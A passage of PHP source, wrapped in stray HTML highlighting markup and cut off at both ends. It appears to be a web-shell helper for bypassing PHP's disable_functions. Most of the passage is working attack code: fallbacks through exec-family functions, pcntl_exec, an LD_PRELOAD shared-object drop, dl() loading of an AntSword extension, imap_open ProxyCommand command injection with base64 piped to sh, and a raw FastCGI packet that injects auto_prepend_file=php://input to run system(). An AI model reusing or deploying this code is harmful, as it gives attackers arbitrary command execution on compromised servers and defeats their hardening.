class="template-variable"><span class="language-handlebars">    elseif (<span class="name">$int</span> == <span class="number">2147483647</span>) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return <span class="literal">false</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    else {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return <span class="string">"error"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function trans_cmd(<span class="name">$cmd</span>, $outfile){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    if (<span class="name">OS</span> == <span class="string">'Windows'</span>){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $cmd = $cmd . <span class="string">" &gt; "</span> . $outfile;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }else{</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $cmd = $cmd . <span class="string">" &gt; "</span> . $outfile . <span class="string">" 2&gt;&amp;1"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    return $cmd;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function send_cmd_to_file(<span class="name">$cmd</span>, $file = <span class="string">'cmd'</span>, $result = <span class="string">'result'</span>) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $outfile = WRITE_DIR . $result;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $cmdfile = WRITE_DIR . $file;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $cmd = trans_cmd(<span class="name">$cmd</span>, $outfile);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    write_file(<span class="name">$cmdfile</span>, $cmd);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    return array(</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        <span class="name">$cmdfile</span>,</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $outfile</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    );</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function send_cmd(<span class="name">$cmd</span>, $result = <span class="string">'result'</span>) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $outfile = WRITE_DIR . $result;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $cmd = trans_cmd(<span class="name">$cmd</span>, $outfile);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    return array(</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        <span class="name">$cmd</span>,</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $outfile</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    );</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function recv_result(<span class="name">$result</span> = <span class="string">'result'</span>) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $ret = read_file(<span class="name">$result</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    @unlink(<span class="name">$result</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    return $ret;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function send_socket(<span class="name">$data</span>, $host, <span class="attr">$port</span>=<span class="number">9000</span>) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    if ( <span class="name">function_exists</span>(<span class="name">'stream_socket_client'</span>) ) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        if (<span class="name">strpos</span>(<span class="name">$host</span>,<span class="string">'unix://'</span>) !== <span class="literal">false</span>) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">            $client = $host;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        } else {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">            $client = <span class="string">'tcp://'</span> . $host . <span class="string">':'</span> . $port;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $fp = stream_socket_client(<span class="name">$client</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } elseif (<span class="name">function_exists</span>(<span class="name">'fsockopen'</span>)) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $fp = fsockopen(<span class="name">$host</span>, $port, $errno, $errstr, <span class="number">30</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } else {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return FAILURE;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    if (<span class="name">$fp</span>) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $content = <span class="string">""</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        fwrite(<span class="name">$fp</span>, $data);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        while (!<span class="name">feof</span>(<span class="name">$fp</span>)) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">            $content .= fgets(<span class="name">$fp</span>, <span class="number">4096</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        fclose(<span class="name">$fp</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return $content;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } else {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return FAILURE;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">/*</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * 第一种: 常规绕过, 寻找漏掉的命令执行函数, 适用于winodws + linux</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * exec、shell_exec、system、passthru、popen、proc_open</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> */</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function common_exec_cmd(<span class="name">$cmd</span>) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $res = <span class="string">''</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    if (<span class="name">function_exists</span>(<span class="name">'exec'</span>)) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        @exec(<span class="name">$cmd</span>, $res);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $res = join(<span class="name">"\n"</span>, $res);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } elseif (<span class="name">function_exists</span>(<span class="name">'shell_exec'</span>)) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $res = @shell_exec(<span class="name">$cmd</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } elseif (<span class="name">function_exists</span>(<span class="name">'system'</span>)) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        @ob_start();</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        @system(<span class="name">$cmd</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $res = @ob_get_contents();</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        @ob_end_clean();</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } elseif (<span class="name">function_exists</span>(<span class="name">'passthru'</span>)) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        @ob_start();</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        @passthru(<span class="name">$cmd</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $res = @ob_get_contents();</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        @ob_end_clean();</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } elseif (@<span class="name">is_resource</span>(<span class="name">$f</span> = @popen(<span class="name">$cmd</span>, <span class="string">"r"</span>))) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $res = <span class="string">''</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        while (!@<span class="name">feof</span>(<span class="name">$f</span>)) {$res .= @fread(<span class="name">$f</span>, <span class="number">1024</span>);}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        @pclose(<span class="name">$f</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } elseif (<span class="name">function_exists</span>(<span class="name">'proc_open'</span>)) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $descriptorspec = array(</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">            <span class="name">0</span> =&gt; array(<span class="name">"pipe"</span>, <span class="string">"r"</span>),</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">            <span class="number">1</span> =&gt; array(<span class="name">"pipe"</span>, <span class="string">"w"</span>),</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">            <span class="number">2</span> =&gt; array(<span class="name">"pipe"</span>, <span class="string">"w"</span>)</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        );</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $process = proc_open(<span class="name">$cmd</span>, $descriptorspec, $pipes, <span class="literal">null</span>, <span class="literal">null</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        if (<span class="name">is_resource</span>(<span class="name">$process</span>)) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">            fwrite(<span class="name">$pipes</span>[0], <span class="string">'$stdin'</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">            fclose(<span class="name">$pipes</span>[0]);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">            $res = stream_get_contents(<span class="name">$pipes</span>[1]);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        }else{</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">            return FAILURE;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } else {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return FAILURE;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    return $res;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">/*</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * 第二种: pcntl_exec绕过</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> */</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function pcntl_exec_cmd(<span class="name">$cmd</span>) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    if (<span class="name">function_exists</span>(<span class="name">'pcntl_exec'</span>)) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $cmd_arr = send_cmd_to_file(<span class="name">$cmd</span>, <span class="string">'cmd.sh'</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        pcntl_exec(<span class="name">"/bin/bash"</span>, array(<span class="name">$cmd_arr</span>[0]));</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return recv_result(<span class="name">$cmd_arr</span>[1]);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } else {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return FAILURE;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//echo pcntl_exec_cmd(<span class="name">"id"</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">/*</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * 第三种: ld_preload绕过: 仅限Linux</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * mail、imap_mail、error_log、mb_send_mail</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * From: https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD/</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> */</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function ld_preload_exec_cmd(<span class="name">$cmd</span>) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $so_file = WRITE_DIR . <span class="string">'system.so'</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    if (<span class="name">ARCH</span> === <span class="number">64</span>) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        write_file(<span class="name">$so_file</span>, hex2bin(<span class="name">$GLOBALS</span>['system_so_x64']));</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } else {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        write_file(<span class="name">$so_file</span>, hex2bin(<span class="name">$GLOBALS</span>['system_so_x32']));</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $cmd_arr = send_cmd(<span class="name">$cmd</span>, <span class="string">'result'</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    putenv(<span class="name">"EVIL_CMDLINE="</span> . $cmd_arr[0]);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    putenv(<span class="name">"LD_PRELOAD="</span> . $so_file);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    if (<span class="name">function_exists</span>(<span class="name">'error_log'</span>)){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        error_log(<span class="name">""</span>, <span class="number">1</span>, <span class="string">"example@example.com"</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } elseif (<span class="name">function_exists</span>(<span class="name">'mail'</span>)){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        mail(<span class="name">""</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } elseif (<span class="name">function_exists</span>(<span class="name">'mb_send_mail'</span>)){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        mb_send_mail(<span class="name">""</span>,<span class="string">""</span>,<span class="string">""</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } elseif ((<span class="name">function_exists</span>(<span class="name">'imap_mail'</span>))){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        imap_mail(<span class="name">""</span>,<span class="string">""</span>,<span class="string">""</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } else {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        @unlink(<span class="name">$so_file</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return FAILURE;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    // del so file</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    @unlink(<span class="name">$so_file</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    return recv_result(<span class="name">$cmd_arr</span>[1]);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//echo ld_preload_exec_cmd(<span class="name">$_GET</span>['cmd']);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//$so_file = WRITE_DIR . <span class="string">'system_x32.so'</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//var_dump(<span class="name">bin2hex</span>(<span class="name">read_file</span>(<span class="name">$so_file</span>)));</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">/*</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * 第四种: ld加载php扩展:</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * ld</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * https://github.com/Medicean/as_bypass_php_disable_functions</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * https://github.com/AntSwordProject/ant_php_extension</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> */</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function dl_exec(<span class="name">$cmd</span>){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    if(<span class="name">function_exists</span>(<span class="name">'dl'</span>)){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $so_file = WRITE_DIR . <span class="string">'php.so'</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        if (<span class="name">ARCH</span> === <span class="number">64</span>) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">            write_file(<span class="name">$so_file</span>, hex2bin(<span class="name">$GLOBALS</span>['php_so_x64']));</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        } else {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">            write_file(<span class="name">$so_file</span>, hex2bin(<span class="name">$GLOBALS</span>['php_so_x32']));</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $so_file = <span class="string">"ant_x64.so"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        dl(<span class="name">$so_file</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $result = antsystem(<span class="name">$cmd</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        // del so file</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        @unlink(<span class="name">$so_file</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return $result;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }else{</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return FAILURE;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//echo dl_exec(<span class="name">"id"</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">/*</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * 第五种: imap_open: 仅限Linux</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> */</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function imap_open_exec(<span class="name">$cmd</span>){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    if (<span class="name">function_exists</span>(<span class="name">'imap_open'</span>)) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $cmd_arr = send_cmd(<span class="name">$cmd</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $server = <span class="string">"x -oProxyCommand=echo\t"</span> . base64_encode(<span class="name">$cmd_arr</span>[0]) . <span class="string">"|base64\t-d|sh}"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        imap_open(<span class="name">'{'</span> . $server . <span class="string">':143/imap}INBOX'</span>, <span class="string">''</span>, <span class="string">''</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return recv_result(<span class="name">$cmd_arr</span>[1]);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }else{</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return FAILURE;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">/*</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * FastCgi:</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * <span class="number">9000</span> port</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * phpx.x-fpm.sock</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> *</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * Fail: windows</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> */</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function p(<span class="name">$ptr</span>){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    return bin2hex(<span class="name">chr</span>(<span class="name">$ptr</span>));</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function pnv(<span class="name">$len</span>){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    if(<span class="name">$len</span> &lt; <span class="number">128</span>){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return p(<span class="name">$len</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }else{</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return p((<span class="name">$len</span> &gt;&gt; <span class="number">24</span>) |<span class="number">0</span>x80) . p((<span class="name">$len</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0</span>xFF) . p((<span class="name">$len</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0</span>xFF) . p(<span class="name">$len</span> &amp; <span class="number">0</span>xFF);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">// 还需要更改具体的fastcgi参数, 目前能在linux下使用</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//$host = <span class="string">'unix:///run/php/php7.3-fpm.sock'</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function fastcgi_exec(<span class="name">$cmd</span>, $file, $host, <span class="attr">$port</span>=<span class="number">9000</span>){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    if (<span class="name">strlen</span>(<span class="name">$cmd</span>) &gt; <span class="number">40</span>) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        echo <span class="string">"Bug: command len need &lt; 40, will be fix."</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $cmd = base64_encode(<span class="name">$cmd</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $php_code = <span class="string">'&lt;?php system(base64_decode("'</span>.$cmd.'"));exit();?&gt;';</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $php_code_len = strlen(<span class="name">$php_code</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $php_code_pad = p((<span class="name">$php_code_len</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0</span>xFF) . p(<span class="name">$php_code_len</span> &amp; <span class="number">0</span>xFF) . p(<span class="name">0</span>) . p(<span class="name">0</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    //$uri = bin2hex(<span class="name">__FILE__</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    //$uri = <span class="string">'/var/www/html/shell.php'</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $uri = $file;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $uri_val_pad = pnv(<span class="name">strlen</span>(<span class="name">$uri</span>));</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $params = <span class="string">'0e02434f4e54454e545f4c454e475448'</span>.bin2hex(<span class="name">$php_code_len</span>).'0c10434f4e54454e545f545950456170706c69636174696f6e2f746578740b0452454d4f54455f504f5254393938350b095345525645525f4e414d456c6f63616c686f7374110b474154455741595f494e54455246414345466173744347492f312e300f0e5345525645525f534f4654574152457068702f66636769636c69656e740b0952454d4f54455f414444523132372e302e302e310f'.$uri_val_pad.'5343524950545f46494c454e414d45'.bin2hex(<span class="name">$uri</span>).'0b'.$uri_val_pad.'5343524950545f4e414d45'.bin2hex(<span class="name">$uri</span>).'091f5048505f56414c55456175746f5f70726570656e645f66696c65203d207068703a2f2f696e7075740e04524551554553545f4d4554484f44504f53540b025345525645525f504f525438300f085345525645525f50524f544f434f4c485454502f312e310c0051554552595f535452494e470f165048505f41444d494e5f56414c5545616c6c6f775f75726c5f696e636c756465203d204f6e0d01444f43554d454e545f524f4f542f0b095345525645525f414444523132372e302e302e310b'.$uri_val_pad.'524551554553545f555249'.bin2hex(<span class="name">$uri</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $params_len = strlen(<span class="name">hex2bin</span>(<span class="name">$params</span>));</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $params_pad = p((<span class="name">$params_len</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0</span>xFF) . p(<span class="name">$params_len</span> &amp; <span class="number">0</span>xFF) . p(<span class="name">0</span>) . p(<span class="name">0</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $fastcgi_data = <span class="string">'01017b0700080000000100000000000001047b07'</span>.$params_pad.$params.'01047b070000000001057b07'.$php_code_pad.bin2hex(<span class="name">$php_code</span>).'01057b0700000000';</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $result = send_socket(<span class="name">hex2bin</span>(<span class="name">$fastcgi_data</span>), $host, $port);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//    if(<span class="name">$result</span> != FAILURE){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//        $start = md5(<span class="name">"s"</span>);;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//        $end = 